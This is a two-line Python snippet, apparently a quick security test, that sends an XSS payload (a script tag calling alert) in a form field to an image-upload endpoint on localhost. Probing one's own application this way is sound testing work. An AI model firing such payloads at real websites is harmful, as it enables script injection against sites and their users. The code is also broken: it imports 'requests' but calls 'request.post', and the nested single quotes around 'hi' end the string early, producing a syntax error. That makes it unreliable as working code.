import requests

request.post('http://localhost:5000/api/upload_image', data={"str": '"><script>alert('hi')</script>"})